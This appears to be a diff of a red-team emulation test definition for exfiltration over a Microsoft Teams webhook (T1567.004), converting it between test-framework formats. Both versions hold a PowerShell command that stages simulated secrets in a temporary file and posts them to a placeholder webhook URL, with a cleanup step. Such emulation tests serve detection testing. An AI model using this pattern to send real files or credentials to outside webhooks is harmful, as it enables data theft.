@@ -1,4 +1,4 @@
-- id: 8fc44266-4817-562a-8a19-c5b74e8c2069
+- requirements: []
   name: Soumaia ART Tests - Exfiltrate staged data to a Microsoft Teams webhook (PowerShell)
   description: 'Stages a file containing simulated sensitive data and exfiltrates its contents to a
 
@@ -10,15 +10,15 @@
 
     See https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook'
   tactic: exfiltration
-  technique:
-    attack_id: T1567.004
-    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          "secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii
-          $body = @{ text = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json
-          Invoke-RestMethod -Uri "https://example.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@00000000-0000-0000-0000-000000000000/IncomingWebhook/ReplaceWithYourWebhookToken" -Method Post -ContentType 'application/json' -Body $body
-        cleanup: |-
-          Remove-Item -Path "$env:TEMP\T1567.004_loot.txt" -ErrorAction Ignore
+  technique_id: T1567.004
+  technique_name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  executors:
+  - cleanup:
+    - Remove-Item -Path "$env:TEMP\T1567.004_loot.txt" -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '"secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii; $body = @{ text = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json; Invoke-RestMethod -Uri "https://example.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@00000000-0000-0000-0000-000000000000/IncomingWebhook/ReplaceWithYourWebhookToken" -Method Post -ContentType ''application/json'' -Body $body'
+  id: 8fc44266-4817-562a-8a19-c5b74e8c2069
